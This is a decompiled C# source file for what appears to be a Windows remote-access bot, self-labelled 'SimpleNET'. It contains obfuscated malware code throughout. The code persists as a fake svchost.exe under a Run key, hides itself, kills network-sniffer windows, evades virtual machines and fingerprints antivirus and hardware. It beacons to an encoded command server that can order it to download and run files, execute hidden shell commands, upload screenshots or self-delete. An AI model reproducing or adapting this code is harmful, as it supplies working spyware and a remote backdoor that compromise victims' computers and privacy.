using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using changeTHISwithRESHACKER.My;

namespace changeTHISwithRESHACKER;

[StandardModule]
internal sealed class Module1Main
{
	public struct LASTINPUTINFO
	{
		public uint cbSize;

		public uint dwTime;
	}

	private static string cLvtWZX5SU3Nq7L = "";

	private static string y8pQJknjhtM36bK = "";

	private static string[] tQRy2VuKzzLjGLD;

	private static string dK3zLCbLFxUH9Xw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

	private static string version = "1.2.3";

	private static string URL = "";

	[AccessedThroughProperty("timer1")]
	private static System.Timers.Timer _timer1;

	[AccessedThroughProperty("timer2")]
	private static System.Timers.Timer _timer2;

	private static string Z9AfcDgu = "";

	private static string RT6FsUnNC2qQkXW = "";

	private static string SSDDO = "";

	private static string mGvTAG3tjWYZWR6 = Path.GetTempPath();

	private static Mutex B4mkWnA;

	private static string F2kqcz5 = "58@07408911@795212792@4".Replace("@", "");

	private static Thread bfJe3CYtDQKjkzM = new Thread(JAQq5uDEbQkAvBt);

	private static string pVGx8zVMtnrFnnH = dK3zLCbLFxUH9Xw + "Mi@croso@ft\\svchost.exe".Replace("@", "");

	private static Thread p4a9uygnSazEjcP = new Thread(M8xXTAubqFEuptR);

	private static System.Timers.Timer timer1
	{
		get
		{
			return _timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ElapsedEventHandler value2 = timer1_Elapsed;
			if (_timer1 != null)
			{
				_timer1.Elapsed -= value2;
			}
			_timer1 = value;
			if (_timer1 != null)
			{
				_timer1.Elapsed += value2;
			}
		}
	} = new System.Timers.Timer();


	private static System.Timers.Timer timer2
	{
		get
		{
			return _timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ElapsedEventHandler value2 = timer2_Elapsed;
			if (_timer2 != null)
			{
				_timer2.Elapsed -= value2;
			}
			_timer2 = value;
			if (_timer2 != null)
			{
				_timer2.Elapsed += value2;
			}
		}
	} = new System.Timers.Timer();


	private static void M8xXTAubqFEuptR()
	{
		while (true)
		{
			try
			{
				string name = "Hos@t @Pr@o@c@e@s@s f@o@r Win@dow@s @Se@rv@ice@s".Replace("@", "");
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Sof@t@wa@r@e\\M@ic@ros@oft@\\Wi@ndo@ws\\C@ur@ren@tVer@sion\\R@un".Replace("@", ""), writable: true);
				if (registryKey.OpenSubKey(name) == null)
				{
					registryKey.SetValue(name, pVGx8zVMtnrFnnH);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(25000);
		}
	}

	private static object pjKGDJ7B7LC3LSk()
	{
		try
		{
			string text = new WebClient().DownloadString(URL);
			if (!text.Contains("Bad Request"))
			{
				text = null;
				return false;
			}
			text = null;
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static void QfZTbBjPq7kSgeD()
	{
		string text = AqaWKJTD7LcqStH("h@wid=".Replace("@", "") + RT6FsUnNC2qQkXW + "&idl@e=".Replace("@", "") + y8pQJknjhtM36bK + "&c@apti@on=".Replace("@", "") + RpdtLDX8Y2fBAZJ());
		if (text.Length == 0)
		{
			return;
		}
		string[] array = Strings.Split(text, "#<SN>#", -1, (CompareMethod)0);
		if (array.Length <= 1)
		{
			return;
		}
		if (Operators.CompareString(array[0], "load", false) == 0)
		{
			Thread thread = new Thread(delegate(object a0)
			{
				bJLmxYuXnjK45Zk(Conversions.ToString(a0));
			});
			thread.IsBackground = true;
			thread.Start(array[1]);
		}
		else if (Operators.CompareString(array[0], "cmd", false) == 0)
		{
			Thread thread = new Thread(delegate(object a0)
			{
				_53ZQC9xm9QQPJDV(Conversions.ToString(a0));
			});
			thread.IsBackground = true;
			thread.Start(array[1]);
		}
		else if (Operators.CompareString(array[0], "scre@en".Replace("@", ""), false) == 0)
		{
			Thread thread = new Thread(Qjrjyk4RfjZrfhz);
			thread.IsBackground = true;
			thread.Start();
		}
		else if (Operators.CompareString(array[0], "del@ete".Replace("@", ""), false) == 0)
		{
			hZ63ERnj();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void SSqzPSAtRsSQAXs()
	{
		if (!Application.get_ExecutablePath().Contains(pVGx8zVMtnrFnnH))
		{
			if (!File.Exists(pVGx8zVMtnrFnnH))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), pVGx8zVMtnrFnnH);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				LcT7rYzBKeSVtXa(Application.get_ExecutablePath());
				try
				{
					File.Delete(pVGx8zVMtnrFnnH);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.Copy(Application.get_ExecutablePath(), pVGx8zVMtnrFnnH);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				Process.Start(pVGx8zVMtnrFnnH);
				ProjectData.EndApp();
				return;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Application.get_ExecutablePath());
			FileAttributes attributes = directoryInfo.Attributes;
			attributes = (directoryInfo.Attributes = attributes | FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private static void JAQq5uDEbQkAvBt()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.ToLower().Contains("w@i@re@sh@a@rk".Replace("@", "")) | process.MainWindowTitle.ToLower().Contains("c@a@i@n".Replace("@", "")))
				{
					try
					{
						process.Kill();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			Thread.Sleep(5000);
		}
	}

	private static string AqaWKJTD7LcqStH(string CqyCxfkQ2saepUL)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URL);
			httpWebRequest.Method = "POST";
			httpWebRequest.Headers["userAgent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0 ";
			httpWebRequest.ContentType = "a@pplicati@on/x-www-f@orm-urlencoded".Replace("@", "");
			byte[] bytes = Encoding.UTF8.GetBytes(CqyCxfkQ2saepUL);
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			requestStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(requestStream);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			requestStream.Close();
			httpWebResponse.Close();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = "";
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void Qjrjyk4RfjZrfhz()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		try
		{
			Rectangle rectangle = Screen.get_AllScreens()[0].get_Bounds();
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			EncoderParameters val = new EncoderParameters(1);
			Rectangle bounds = default(Rectangle);
			if (Screen.get_AllScreens().Length >= 2)
			{
				bounds = Screen.get_AllScreens()[1].get_Bounds();
				rectangle = Rectangle.Union(rectangle, bounds);
			}
			val.get_Param()[0] = new EncoderParameter(Encoder.Quality, 80L);
			Bitmap val2 = new Bitmap(rectangle.Width, rectangle.Height);
			try
			{
				Graphics val3 = Graphics.FromImage((Image)(object)val2);
				try
				{
					Font val4 = new Font(FontFamily.get_GenericSansSerif(), 14f, (FontStyle)1, (GraphicsUnit)3);
					if (bounds.Left > 0)
					{
						val3.CopyFromScreen(0, 0, 0, 0, ((Image)val2).get_Size());
					}
					else
					{
						val3.CopyFromScreen(bounds.Left, 0, 0, 0, ((Image)val2).get_Size());
					}
					val3.DrawString("Si@mp@l@e@NET v".Replace("@", "") + version, val4, Brushes.get_Red(), 6f, 6f);
					((Image)val2).Save(mGvTAG3tjWYZWR6 + RT6FsUnNC2qQkXW + ".jpeg", imageEncoders[1], val);
					try
					{
						WebClient webClient = new WebClient();
						webClient.Encoding = Encoding.Default;
						webClient.Headers.Add("Content-Type", "binary/octet-stream");
						ServicePointManager.Expect100Continue = false;
						webClient.UploadFile(URL + "?scr", "POST", mGvTAG3tjWYZWR6 + RT6FsUnNC2qQkXW + ".jpeg");
						FileSystem.Kill(mGvTAG3tjWYZWR6 + RT6FsUnNC2qQkXW + ".jpeg");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static void bJLmxYuXnjK45Zk(string Tn9rxFcyuQg7TUM)
	{
		checked
		{
			try
			{
				if (File.Exists(mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1)))
				{
					File.Delete(mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile(Tn9rxFcyuQg7TUM, mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				Process.Start(mGvTAG3tjWYZWR6 + Tn9rxFcyuQg7TUM.Substring(Tn9rxFcyuQg7TUM.LastIndexOf("/") + 1));
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void dL6UcMGJqRVksTk()
	{
		y8pQJknjhtM36bK = hXXLYZ35uaeUHQN();
		tQRy2VuKzzLjGLD = Strings.Split(AqaWKJTD7LcqStH("p@cn@ame=".Replace("@", "") + Z9AfcDgu + "&@hw@id=".Replace("@", "") + RT6FsUnNC2qQkXW + "&os=" + SSDDO + "&i@nfo@s=".Replace("@", "") + cLvtWZX5SU3Nq7L + "&ve@rsion@=".Replace("@", "") + version + "&id@le=".Replace("@", "") + y8pQJknjhtM36bK + "&c@aptio@n=".Replace("@", "") + RpdtLDX8Y2fBAZJ()), "<#>", -1, (CompareMethod)0);
		timer1.Interval = Conversions.ToDouble(tQRy2VuKzzLjGLD[0]);
		if (Operators.CompareString(version, tQRy2VuKzzLjGLD[1], false) != 0)
		{
			_5yHWhwWLGhm23vQ(tQRy2VuKzzLjGLD[2]);
		}
		else
		{
			timer1.Start();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void Vwtvjc3HXD7xP47()
	{
		try
		{
			URL = new WebClient().DownloadString(NakzxCH48YVUtra("g689pj135689g257m819058689d135c819p708135862689nylpm819044058058:261"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	private static void BKqh5rkVhynxzAZ()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		try
		{
			Z9AfcDgu = Environment.MachineName + "\\" + Environment.UserName;
			RT6FsUnNC2qQkXW = WindowsIdentity.GetCurrent().User!.Value.ToString();
			cLvtWZX5SU3Nq7L = nMapsreKWZZ454G();
			ComputerInfo val = new ComputerInfo();
			SSDDO = val.get_OSFullName().ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void _53ZQC9xm9QQPJDV(string ujpmHVy82wdJP5G)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		try
		{
			processStartInfo.Arguments = "/c " + ujpmHVy82wdJP5G;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "c@md.@e@xe".Replace("@", "");
			Process.Start(processStartInfo);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void _5yHWhwWLGhm23vQ(string Links)
	{
		if (File.Exists(mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.ex@e"))
		{
			try
			{
				File.Delete(mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.e@xe");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		LcT7rYzBKeSVtXa(Application.get_ExecutablePath());
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Links, mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.exe");
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 5000 > Nul & Del \"" + Application.get_ExecutablePath().ToString() + "\" & copy \"" + mGvTAG3tjWYZWR6 + "Hp4A7uPv6k8UbqD.exe\" \"" + Application.get_ExecutablePath().ToString() + "\" & \"" + Application.get_ExecutablePath().ToString() + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "c@m@d.e@xe".Replace("@", "");
			Process.Start(processStartInfo);
			ProjectData.EndApp();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static void LcT7rYzBKeSVtXa(string patth)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(patth);
			_ = directoryInfo.Attributes;
			directoryInfo.Attributes = FileAttributes.Normal;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("USER32.DLL")]
	private static extern bool GetLastInputInfo(ref LASTINPUTINFO ii);

	public static long r5SGeUE53c99B2H()
	{
		checked
		{
			long num2 = default(long);
			try
			{
				LASTINPUTINFO ii = default(LASTINPUTINFO);
				ii.cbSize = (uint)Marshal.SizeOf((object)ii);
				if (GetLastInputInfo(ref ii))
				{
					long num = ii.dwTime;
					num2 = Environment.TickCount - num;
					if (num2 < 0L)
					{
						num2 = num2 + 4294967295L + 1L;
						return num2;
					}
					return num2;
				}
				return num2;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return num2;
			}
		}
	}

	public static string hXXLYZ35uaeUHQN()
	{
		checked
		{
			try
			{
				TimeSpan timeSpan = new TimeSpan(r5SGeUE53c99B2H() * 10000L);
				TimeSpan timeSpan2 = timeSpan;
				string text = Strings.Split(timeSpan2.ToString(), ".", -1, (CompareMethod)0)[0];
				int num = (int)Math.Round(Conversions.ToDouble(text.Split(new char[1] { ':' })[0]) * 3600.0);
				int num2 = (int)Math.Round(Conversions.ToDouble(text.Split(new char[1] { ':' })[1]) * 60.0);
				int num3 = Conversions.ToInteger(text.Split(new char[1] { ':' })[2]);
				return Conversions.ToString(num + num2 + num3);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "ERROR";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowText(IntPtr hwnd, StringBuilder text, int count);

	private static string RpdtLDX8Y2fBAZJ()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		IntPtr foregroundWindow = GetForegroundWindow();
		if (GetWindowText(foregroundWindow, stringBuilder, 256) > 0)
		{
			return stringBuilder.ToString();
		}
		return "";
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void gPjQpz7n69uH57B()
	{
		B4mkWnA = new Mutex(initiallyOwned: false, F2kqcz5);
		if (!B4mkWnA.WaitOne(0, exitContext: false))
		{
			B4mkWnA.Close();
			B4mkWnA = null;
			ProjectData.EndApp();
		}
	}

	public static string NakzxCH48YVUtra(string text)
	{
		char[] array = text.Replace("261", "ptth").Replace("058", "/").Replace("135", ".")
			.Replace("044", "s")
			.Replace("708", "nuf")
			.Replace("819", "i")
			.Replace("257", "a")
			.Replace("862", "w")
			.Replace("689", "e")
			.Replace("803", "u")
			.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	private static string nMapsreKWZZ454G()
	{
		checked
		{
			try
			{
				string text = "";
				string text2 = "none";
				try
				{
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\" + Environment.MachineName + "\\ro@o@t\\Se@cur@ityC@e@nt@er2".Replace("@", ""), (string)null));
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecQuery", new object[1] { "Se@le@ct * F@rom A@nti@Vir@usP@roduct".Replace("@", "") }, (string[])null, (Type[])null, (bool[])null));
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)objectValue2).GetEnumerator();
						while (enumerator.MoveNext())
						{
							object objectValue3 = RuntimeHelpers.GetObjectValue(enumerator.Current);
							text2 = Conversions.ToString(NewLateBinding.LateGet(objectValue3, (Type)null, "displayName", new object[0], (string[])null, (Type[])null, (bool[])null));
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				text = text + "A@V P@ro@gr@a@m: ".Replace("@", "") + text2 + "\r\n";
				try
				{
					object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.GetObject("w@i@nm@gm@ts:".Replace("@", ""), (string)null), (Type)null, "InstancesOf", new object[1] { "Wi@n32_Pro@cess@or".Replace("@", "") }, (string[])null, (Type[])null, (bool[])null));
					IEnumerator enumerator2 = default(IEnumerator);
					try
					{
						enumerator2 = ((IEnumerable)objectValue4).GetEnumerator();
						while (enumerator2.MoveNext())
						{
							object objectValue5 = RuntimeHelpers.GetObjectValue(enumerator2.Current);
							text = text + "C@P@U Na@m@e: ".Replace("@", "") + Strings.Trim(Conversions.ToString(NewLateBinding.LateGet(objectValue5, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))).ToString() + "\r\n";
							text = text + "C@P@U Ta@ktra@te: ".Replace("@", "") + NewLateBinding.LateGet(objectValue5, (Type)null, "MaxClockSpeed", new object[0], (string[])null, (Type[])null, (bool[])null).ToString() + " MHz x" + Environment.ProcessorCount + "\r\n";
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
					objectValue4 = null;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					int num = (int)Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1048576.0);
					if (num.ToString().Length <= 3)
					{
						text = text + "RA@M: ".Replace("@", "") + num + " M@B".Replace("@", "") + "\r\n";
					}
					else
					{
						num = (int)Math.Round((double)num / 1024.0);
						text = text + "R@AM: ".Replace("@", "") + num + " G@B".Replace("@", "") + "\r\n";
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.GetObject("w@i@nm@gm@ts:".Replace("@", ""), (string)null), (Type)null, "InstancesOf", new object[1] { "Win3@2_Vi@de@oCont@roll@er".Replace("@", "") }, (string[])null, (Type[])null, (bool[])null));
					IEnumerator enumerator3 = default(IEnumerator);
					try
					{
						enumerator3 = ((IEnumerable)objectValue6).GetEnumerator();
						while (enumerator3.MoveNext())
						{
							object objectValue7 = RuntimeHelpers.GetObjectValue(enumerator3.Current);
							text = text + "G@P@U Na@m@e: ".Replace("@", "") + Strings.Trim(Conversions.ToString(NewLateBinding.LateGet(objectValue7, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null))).ToString() + "\r\n";
						}
					}
					finally
					{
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				return text;
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				string result = "ERROR";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static bool Lac7T9wk()
	{
		bool result = default(bool);
		try
		{
			string text = "";
			object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.GetObject("w@i@nm@gm@ts:".Replace("@", ""), (string)null), (Type)null, "ExecQuery", new object[1] { "S@ELE@CT * FRO@M Wi@n32_V@i@deoCo@nt@ro@ller".Replace("@", "") }, (string[])null, (Type[])null, (bool[])null));
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)objectValue).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
					text = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (text.Contains("V@M".Replace("@", "")) | text.Contains("Virt@ualB@ox".Replace("@", "")) | text.Contains("VM@wa@re".Replace("@", "")) | text.Contains("Cir@ru@s Log@ic".Replace("@", "")))
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void hZ63ERnj()
	{
		LcT7rYzBKeSVtXa(Application.get_ExecutablePath());
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		try
		{
			processStartInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + Application.get_ExecutablePath().ToString() + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "c@md.@e@xe".Replace("@", "");
			Process.Start(processStartInfo);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void timer1_Elapsed(object sender, ElapsedEventArgs e)
	{
		y8pQJknjhtM36bK = hXXLYZ35uaeUHQN();
		QfZTbBjPq7kSgeD();
	}

	private static void timer2_Elapsed(object sender, ElapsedEventArgs e)
	{
		Vwtvjc3HXD7xP47();
		if (Operators.ConditionalCompareObjectEqual(pjKGDJ7B7LC3LSk(), (object)true, false))
		{
			BKqh5rkVhynxzAZ();
			dL6UcMGJqRVksTk();
		}
	}

	[STAThread]
	public static void Main()
	{
		gPjQpz7n69uH57B();
		if (Lac7T9wk())
		{
			hZ63ERnj();
		}
		p4a9uygnSazEjcP.IsBackground = true;
		p4a9uygnSazEjcP.Start();
		SSqzPSAtRsSQAXs();
		bfJe3CYtDQKjkzM.IsBackground = true;
		bfJe3CYtDQKjkzM.Start();
		Vwtvjc3HXD7xP47();
		if (Operators.ConditionalCompareObjectEqual(pjKGDJ7B7LC3LSk(), (object)true, false))
		{
			BKqh5rkVhynxzAZ();
			dL6UcMGJqRVksTk();
		}
		else
		{
			_timer2.Interval = 120000.0;
			_timer2.Start();
		}
		a.BlockAccess();
		Application.Run();
	}
}
